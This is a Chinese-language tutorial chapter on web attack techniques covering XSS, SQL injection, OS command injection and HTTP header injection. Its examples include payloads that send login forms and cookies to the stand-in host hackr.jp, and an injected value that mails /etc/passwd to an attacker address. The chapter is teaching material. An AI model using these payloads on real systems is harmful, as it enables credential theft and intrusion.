# 针对 Web 的攻击技术  

目前，来自互联网的攻击大多是冲着 Web 站点来的，它们大多把 Web 应用作为攻击目标。

## HTTP 不具备必要的安全功能  

HTTP 就是一个通用的单纯协议机制。因此它具备较多优势，但是在安全性方面则呈劣势。  开发者需要自行设计并开发认证及会话管理功能来满足 Web 应用的安全。 而自行设计就意味着会出现各种形形色色的实现。结果，安全等级并不完备， 可仍在运作的 Web 应用背后却隐藏着各种容易被攻击者滥用的安全漏洞的 Bug。  

## 在客户端即可篡改请求  

在 Web 应用中，从浏览器那接收到的 HTTP 请求的全部内容，都可以在客户端自由地变更、 篡改。所以 Web 应用可能会接收到与预期数据不相同的内容。  

在 HTTP 请求报文内加载攻击代码，就能发起对 Web 应用的攻击。通过 URL 查询字段或表单、 HTTP 首部、 Cookie 等途径把攻击代码传入，若这时 Web 应用存在安全漏洞，那内部信息就会遭到窃取，或被攻击者拿到管理权限。  

![](./img/web_attack.png)

## 针对 Web 应用的攻击模式  

对 Web 应用的攻击模式有以下两种：

- 主动攻击
- 被动攻击  

### 以服务器为目标的主动攻击  

主动攻击（ active attack）是指攻击者通过直接访问 Web 应用，把攻击代码传入的攻击模式。 由于该模式是直接针对服务器上的资源进行攻击，因此攻击者需要能够访问到那些资源。  

主动攻击模式里具有代表性的攻击是 SQL 注入攻击和 OS 命令注入攻击。  

![](./img/active_attack.png)

### 以服务器为目标的被动攻击  

被动攻击（ passive attack）是指利用圈套策略执行攻击代码的攻击模式。在被动攻击过程中，攻击者不直接对目标 Web 应用访问发起攻击。被动攻击通常的攻击模式如下所示：

![](./img/passive_attack.png)

- 攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的 HTTP 请求  
- 当用户不知不觉中招之后，用户的浏览器或邮件客户端就会触发这个陷阱  
- 中招后的用户浏览器会把含有攻击代码的 HTTP 请求发送给作为攻击目标的 Web 应用，运行攻击代码  
- 执行完攻击代码，存在安全漏洞的 Web 应用会成为攻击者的跳板，可能导致用户所持的 Cookie 等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果  

利用被动攻击，可发起对原本从互联网上无法直接访问的企业内网等网络的攻击。只要用户踏入攻击者预先设好的陷阱，在用户能够访问到的网络范围内，即使是企业内网也同样会受到攻击。  

![](./img/attack_intranet.png)

# 因输出值转义不完全引发的安全漏洞  

实施 Web 应用的安全对策可大致分为以下两部分：

- 客户端的验证
- Web 应用端（服务器端）的验证
  - 输入值验证
  - 输出值转义  

![](./img/validation_data.png)

多数情况下采用 JavaScript 在客户端验证数据。可是在客户端允许篡改数据或关闭 JavaScript，不适合将 JavaScript 验证作为安全的防范对策。保留客户端验证只是为了尽早地辨识输入错误， 起到提高 UI 体验的作用。  

从数据库或文件系统、 HTML、邮件等输出 Web 应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略。 当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。  

## 跨站脚本攻击  

跨站脚本攻击（ Cross-Site Scripting， XSS）是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。 动态创建的 HTML 部分有可能隐藏着安全漏洞。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击。  

跨站脚本攻击有可能造成以下影响：

- 利用虚假输入表单骗取用户个人信息
- 利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者发送恶意请求
- 显示伪造的文章或图片  

### 跨站脚本攻击案例  

下面以编辑个人信息页面为例讲解跨站脚本攻击：

![](./img/xss_1.png)

此处输入带有山口一郎这样的 HTML 标签的字符串：

![](./img/xss_2.png)  

删除线显示出来并不会造成太大的不利后果， 但如果换成使用 script 标签将会如何呢。  

跨站脚本攻击属于被动攻击模式，因此攻击者会事先布置好用于攻击的陷阱。下图网站通过地址栏中 URI 的查询字段指定 ID，即相当于在表单内自动填写字符串的功能。 而就在这个地方，隐藏着可执行跨站脚本攻击的漏洞。  

![](./img/xss_3.png)

充分熟知此处漏洞特点的攻击者，于是就创建了下面这段嵌入恶意代码的 URL。并隐藏植入事先准备好的欺诈邮件中或 Web 页面内，诱使用户去点击该 URL ：

```
http://example.jp/login?ID="><script>var+f=document.getElementById("login");+f.action="http://hackr.jp/pwget";+f.method="get";</script><span+s="
```

浏览器打开该 URI 后，直观感觉没有发生任何变化，但设置好的脚本却偷偷开始运行了。 当用户在表单内输入 ID 和密码之后，就会直接发送到攻击者的网站（也就是 hackr.jp），导致个人登录信息被窃取。   

![](./img/xss_4.png)

### 对用户Cookie的窃取攻击  

除了在表单中设下圈套之外，下面那种恶意构造的脚本同样能够以跨站脚本攻击的方式，窃取到用户的 Cookie 信息：

```
<script src=http://hackr.jp/xss.js></script>
```

该脚本内指定的 http://hackr.jp/xss.js 文 件。 即下面这段采用 JavaScript 编写的代码：

```
var content = escape(document.cookie);
document.write("<img src=http://hackr.jp/?");
document.write(content);
document.write(">");
```

在存在可跨站脚本攻击安全漏洞的 Web 应用上执行上面这段JavaScript 程序， 即可访问到该 Web 应用所处域名下的 Cookie 信息。然后这些信息会发送至攻击者的 Web 网站（ http://hackr.jp/），记录在他的登录日志中。结果，攻击者就这样窃取到用户的 Cookie 信息了：

![](./img/xss_cookie.png)

## SQL 注入攻击  

SQL 注入（ SQL Injection）是指针对 Web 应用使用的数据库，通过运行非法的 SQL 而产生的攻击。该安全隐患有可能引发极大的威胁，有时会直接导致个人信息及机密信息的泄露。  

SQL 注入攻击有可能会造成以下等影响：

- 非法查看或篡改数据库内的数据
- 规避认证
- 执行和数据库服务器业务关联的程序等  

### SQL注入攻击案例  

下面以某个购物网站的搜索功能为例，讲解 SQL 注入攻击。通过该功能，我们可以将某作者的名字作为搜索关键字，查找该作者的所有著作：

![](./img/sql_attack.png)

![](./img/sql_attack1.png)

```
SELECT * FROM bookTbl WHERE author = '上野宣' and flag = 1;
```

刚才指定查询字段的上野宣改写成“上野宣 '--” ：

```
SELECT * FROM bookTbl WHERE author ='上野宣 '●-●-' and flag=1;
```

![](./img/sql_attack2.png)

SQL 语句中的 -- 之后全视为注释。即， and flag=1 这个条件被自动忽略了：

![](./img/sql_attack3.png)

### SQL注入攻击破坏SQL语句结构的案例  

SQL 注入是攻击者将 SQL 语句改变成开发者意想不到的形式以达到破坏结构的攻击。  

![](./img/sql_attack4.png)

上图中颜色标记的字符串最开始的单引号 (') 表示会将 author 的字面值括起来， 以到达第二个单引号后作为结束。因此， author 的字面值就成了上野宣， 而后面的 -- 则不再属于 author 字面值，会被解析成其他的句法。  

## OS 命令注入攻击  

OS 命令注入攻击（ OS Command Injection）是指通过 Web 应用，执行非法的操作系统命令达到攻击的目的。 只要在能调用 Shell 函数的地方就有存在被攻击的风险。  

OS 命令注入攻击可以向 Shell 发送命令，让 Windows 或 Linux 操作系统的命令行启动程序。 也就是说，通过 OS 注入攻击可执行 OS 上安装着的各种程序。  

### OS注入攻击案例  

下面以咨询表单的发送功能为例，讲解 OS 注入攻击。该功能可将用户的咨询邮件按已填写的对方邮箱地址发送过去。  

![](./img/os_command_injection.png)

下面摘选处理该表单内容的一部分核心代码：

```
my $adr = $q->param('mailaddress');
open(MAIL, "¦ /usr/sbin/sendmail $adr");
print MAIL "From: info@example.com\n";
```

程序中的 open 函数会调用 sendmail 命令发送邮件，而指定的邮件发送地址即 $adr 的值。  

攻击者将下面的值指定作为邮件地址：

```
; cat /etc/passwd ¦ mail hack@example.jp
```

程序接收该值，构成以下的命令组合：

```
¦ /usr/sbin/sendmail ; cat /etc/passwd ¦ mail hack@example.jp
```

攻击者的输入值中含有分号（ ;）。这个符号在 OS 命令中，会被解析为分隔多个执行命令的标记。

可见， sendmail 命令执行被分隔后， 接下去就会执行 cat /etc/passwd | mail hack@example.jp 这样的命令了。结果，含有 Linux 账户信息 /etc/passwd 的文件，就以邮件形式发送给了 hack@example.jp。  

## HTTP 首部注入攻击  

HTTP 首部注入攻击（ HTTP Header Injection）是指攻击者通过在响应首部字段内插入换行， 添加任意响应首部或主体的一种攻击。属于被动攻击模式。  

向首部主体内添加内容的攻击称为 HTTP 响应截断攻击（ HTTP Response Splitting Attack）。  

如下所示， Web 应用有时会把从外部接收到的数值，赋给响应首部字段 Location 和 Set-Cookie ：

```
Location: http://www.example.com/a.cgi?q=12345
Set-Cookie: UID=12345

* 12345就是插入值
```

HTTP 首部注入攻击有可能会造成以下一些影响：

- 设置任何 Cookie 信息
- 重定向至任意 URL
- 显示任意的主体（HTTP 响应截断攻击）  

### HTTP首部注入攻击案例  

下面我们以选定某个类别后即可跳转至各类别对应页面的功能为例，讲解 HTTP 首部注入攻击。该功能为每个类别都设定了一个类别ID 值，一旦选定某类别，就会将该 ID 值反映在响应内的 Location 首部字段内，形如 Location: http://example.com/?cat=101。令浏览器发生重定向跳转：

![](./img/http_header_injection.png)



















